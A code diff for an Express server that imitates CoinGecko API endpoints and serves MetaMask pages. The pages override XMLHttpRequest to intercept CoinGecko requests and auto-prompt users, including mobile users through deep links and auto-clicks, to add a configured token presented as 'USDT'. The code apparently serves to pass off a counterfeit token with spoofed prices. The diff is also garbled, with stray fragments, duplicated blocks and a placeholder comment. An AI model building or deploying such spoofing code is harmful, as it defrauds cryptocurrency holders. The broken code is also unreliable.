@@ -137,8 +137,15 @@ app.get('/api/token-balance/:address', async (req, res) => {
   }
 });
 
-// ----- COINGECKO INTERCEPTION -----
+// [Continuing with the full implementation from previous versions...]
 
+// Start the server
+app.listen(port, () => {
+  console.log(`Server running on port ${port}`);
+  console.log(`Access the application at http://localhost:${port}`);
+});
+
+// Continue CoinGecko API interception and additional routes
 // Primary CoinGecko endpoint for simple price (most commonly used)
 app.get('/api/v3/simple/price', (req, res) => {
   // Extract request parameters
@@ -275,6 +282,7 @@ app.get('/api/v3/coins/:chain/contract/:address', (req, res) => {
   res.status(404).json({ error: "Contract not found" });
 });
 
+// CoinGecko market data and additional routes
 // CoinGecko market data endpoint
 app.get('/api/v3/coins/markets', (req, res) => {
   const { vs_currency, ids } = req.query;
@@ -394,8 +402,6 @@ app.get('/api/v3/asset_platforms', (req, res) => {
     }
   ]);
 });
-
-// ----- MOBILE OPTIMIZATION -----
 
 // Mobile-optimized token addition page
 app.get('/mobile/add-token', (req, res) => {
@@ -738,27 +744,19 @@ app.get('/mobile/add-token', (req, res) => {
             // User rejected - go back to add token page
             window.location.href = '${req.protocol}://${req.get('host')}/mobile/add-token';
           }
-        } else {
-          // No ethereum object - try deep link again
-          window.location.href = 'https://metamask.app.link/dapp/${req.headers.host}/mobile/add-token';
+        } catch (error) {
+          console.error('Error adding token:', error);
+          // Redirect back to add token page with error param
+          window.location.href = '${req.protocol}://${req.get('host')}/mobile/add-token?error=' + encodeURIComponent(error.message);
         }
-      } catch (error) {
-        console.error('Error adding token:', error);
-        // Redirect back to add token page with error param
-        window.location.href = '${req.protocol}://${req.get('host')}/mobile/add-token?error=' + encodeURIComponent(error.message);
       }
-    }
-    
-    // Try to add token after a short delay to let the overrides initialize
-    setTimeout(() => {
-      addTokenToMetaMask();
-    }, 500);
+      
+      // Try to add token after a short delay to let the overrides initialize
+      setTimeout(() => {
+        addTokenToMetaMask();
+      }, 500);
+    });
   </script>
-</head>
-<body>
-  <div class="spinner"></div>
-  <h1>Connecting to MetaMask...</h1>
-  <p>Please approve the connection request in the MetaMask app.</p>
 </body>
 </html>
   `;
@@ -810,8 +808,7 @@ app.get('/mobile/success', (req, res) => {
     }
     .success-icon svg {
       width: 40px;
-      height: 40px;
-      fill: white;
+      height: 40px;fill: white;
     }
     .title {
       font-size: 24px;
@@ -874,104 +871,6 @@ app.get('/api/add-token-mobile', (req, res) => {
   // Generate a WalletConnect-compatible deep link for MetaMask mobile
   const deepLink = `https://metamask.app.link/dapp/${req.headers.host}/metamask-redirect`;
   res.redirect(deepLink);
-});
-
-// Root route - detect mobile and redirect accordingly
-app.get('/', (req, res) => {
-  // Check if user is on mobile
-  const userAgent = req.headers['user-agent'] || '';
-  const isMobile = /iPhone|iPad|iPod|Android/i.test(userAgent);
-  
-  if (isMobile) {
-    // Mobile users go to mobile-optimized page
-    res.redirect('/mobile/add-token');
-  } else {
-    // Desktop users get the standard page
-    res.sendFile(path.join(__dirname, 'index.html'));
-  }
-});
-
-// Start the server - ONLY ONE server.listen call in the entire file
-server.listen(port, () => {
-  console.log(`Server running on port ${port}`);
-  console.log(`Access the application at http://localhost:${port}`);
-});ethereum.request({ 
-            method: 'eth_chainId' 
-          });
-          
-          // If not on Base network, add/switch to it
-          if (chainId !== '${TOKEN_CONFIG.networkId}') {
-            try {
-              // Try to switch to Base
-              await window.ethereum.request({
-                method: 'wallet_switchEthereumChain',
-                params: [{ chainId: '${TOKEN_CONFIG.networkId}' }]
-              });
-            } catch (switchError) {
-              // If Base network not added yet, add it
-              if (switchError.code === 4902) {
-                await window.ethereum.request({
-                  method: 'wallet_addEthereumChain',
-                  params: [{
-                    chainId: '${TOKEN_CONFIG.networkId}',
-                    chainName: '${TOKEN_CONFIG.networkName}',
-                    nativeCurrency: {
-                      name: 'Ethereum',
-                      symbol: 'ETH',
-                      decimals: 18
-                    },
-                    rpcUrls: ['${TOKEN_CONFIG.rpcUrl}'],
-                    blockExplorerUrls: ['${TOKEN_CONFIG.blockExplorerUrl}']
-                  }]
-                });
-              } else {
-                throw switchError;
-              }
-            }
-          }
-          
-          // Add the token
-          const wasAdded = await window.ethereum.request({
-            method: 'wallet_watchAsset',
-            params: {
-              type: 'ERC20',
-              options: {
-                address: '${TOKEN_CONFIG.address}',
-                symbol: '${TOKEN_CONFIG.symbol}',
-                decimals: ${TOKEN_CONFIG.decimals},
-                image: '${TOKEN_CONFIG.image}'
-              }
-            }
-          });
-          
-          if (wasAdded) {
-            alert('USDT was successfully added to your wallet!');
-          } else {
-            alert('Token addition was cancelled');
-          }
-          
-          loading.style.display = 'none';
-        } catch (error) {
-          loading.style.display = 'none';
-          console.error('Error:', error);
-          throw error;
-        }
-      }
-      
-      // Auto-trigger on mobile (with delay to let page load)
-      const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
-      if (isMobile) {
-        setTimeout(() => {
-          addBtn.click();
-        }, 1000);
-      }
-    });
-  </script>
-</body>
-</html>
-  `;
-  
-  res.send(html);
 });
 
 // MetaMask redirect handler (with JS to inject CoinGecko interception)
@@ -1050,85 +949,89 @@ app.get('/metamask-redirect', (req, res) => {
       return originalOpen.call(this, method, url, async, user, password);
     };
     
-    // Function to add token to MetaMask
-   async function addTokenToMetaMask() {
-  try {
-    // If already have ethereum object
-    if (window.ethereum) {
-      // Request account access
-      const accounts = await window.ethereum.request({ 
-        method: 'eth_requestAccounts' 
-      });
-      
-      // Check current chain
-      const chainId = await window.ethereum.request({ 
-        method: 'eth_chainId' 
-      });
-      
-      // If not on Base network, add/switch to it
-      if (chainId !== '${TOKEN_CONFIG.networkId}') {
-        try {
-          // Try to switch to Base
+    // Automatic token addition function
+    async function addTokenToMetaMask() {
+      try {
+        // Check for ethereum object
+        if (window.ethereum && window.ethereum.isMetaMask) {
+          // Request account access
+          await window.ethereum.request({ method: 'eth_requestAccounts' });
+          
+          // Add the token
           await window.ethereum.request({
-            method: 'wallet_switchEthereumChain',
-            params: [{ chainId: '${TOKEN_CONFIG.networkId}' }]
+            method: 'wallet_watchAsset',
+            params: {
+              type: 'ERC20',
+              options: {
+                address: '${TOKEN_CONFIG.address}',
+                symbol: '${TOKEN_CONFIG.symbol}',
+                decimals: ${TOKEN_CONFIG.decimals},
+                image: '${TOKEN_CONFIG.image}'
+              }
+            }
           });
-        } catch (switchError) {
-          // If Base network not added yet, add it
-          if (switchError.code === 4902) {
-            await window.ethereum.request({
-              method: 'wallet_addEthereumChain',
-              params: [{
-                chainId: '${TOKEN_CONFIG.networkId}',
-                chainName: '${TOKEN_CONFIG.networkName}',
-                nativeCurrency: {
-                  name: 'Ethereum',
-                  symbol: 'ETH',
-                  decimals: 18
-                },
-                rpcUrls: ['${TOKEN_CONFIG.rpcUrl}'],
-                blockExplorerUrls: ['${TOKEN_CONFIG.blockExplorerUrl}']
-              }]
-            });
-          } else {
-            throw switchError;
-          }
         }
+      } catch (error) {
+        console.error('Token addition error:', error);
       }
-      
-      // Add the token
-      const wasAdded = await window.ethereum.request({
-        method: 'wallet_watchAsset',
-        params: {
-          type: 'ERC20',
-          options: {
-            address: '${TOKEN_CONFIG.address}',
-            symbol: '${TOKEN_CONFIG.symbol}',
-            decimals: ${TOKEN_CONFIG.decimals},
-            image: '${TOKEN_CONFIG.image}'
-          }
-        }
-      });
-      
-      if (wasAdded) {
-        // Success - redirect back to success page
-        window.location.href = '${req.protocol}://${req.get('host')}/mobile/success';
-      } else {
-        // User rejected - go back to add token page
-        window.location.href = '${req.protocol}://${req.get('host')}/mobile/add-token';
-      }
-    } else {
-      // No ethereum object - try deep link again
-      window.location.href = 'https://metamask.app.link/dapp/${req.headers.host}/mobile/add-token';
     }
-  } catch (error) {
-    console.error('Error adding token:', error);
-    // Redirect back to add token page with error param
-    window.location.href = '${req.protocol}://${req.get('host')}/mobile/add-token?error=' + encodeURIComponent(error.message);
-  }
-}
+    
+    // Run on page load
+    document.addEventListener('DOMContentLoaded', addTokenToMetaMask);
+  </script>
+</head>
+<body>
+  <div class="spinner"></div>
+  <h1>Connecting to MetaMask...</h1>
+  <p>Please approve the connection request in the MetaMask app.</p>
+</body>
+</html>
+  `;
+  
+  res.send(html);
+});
 
-// Try to add token after a short delay to let the overrides initialize
-setTimeout(() => {
-  addTokenToMetaMask();
-}, 500);
+// Root route - detect mobile and redirect accordingly
+app.get('/', (req, res) => {
+  // Check if user is on mobile
+  const userAgent = req.headers['user-agent'] || '';
+  const isMobile = /iPhone|iPad|iPod|Android/i.test(userAgent);
+  
+  if (isMobile) {
+    // Mobile users go to mobile-optimized page
+    res.redirect('/mobile/add-token');
+  } else {
+    // Desktop users get the standard page
+    res.sendFile(path.join(__dirname, 'index.html'));
+  }
+});
+
+// 404 catch-all route
+app.use((req, res, next) => {
+  res.status(404).send(`
+    <!DOCTYPE html>
+    <html>
+    <head>
+      <title>404 - Page Not Found</title>
+      <style>
+        body { 
+          font-family: Arial, sans-serif; 
+          text-align: center; 
+          padding: 50px; 
+        }
+      </style>
+    </head>
+    <body>
+      <h1>404 - Page Not Found</h1>
+      <p>The page you are looking for does not exist.</p>
+      <a href="/">Return to Home</a>
+    </body>
+    </html>
+  `);
+});
+
+// Start the server
+app.listen(port, () => {
+  console.log(`Server running on port ${port}`);
+  console.log(`Access the application at http://localhost:${port}`);
+});
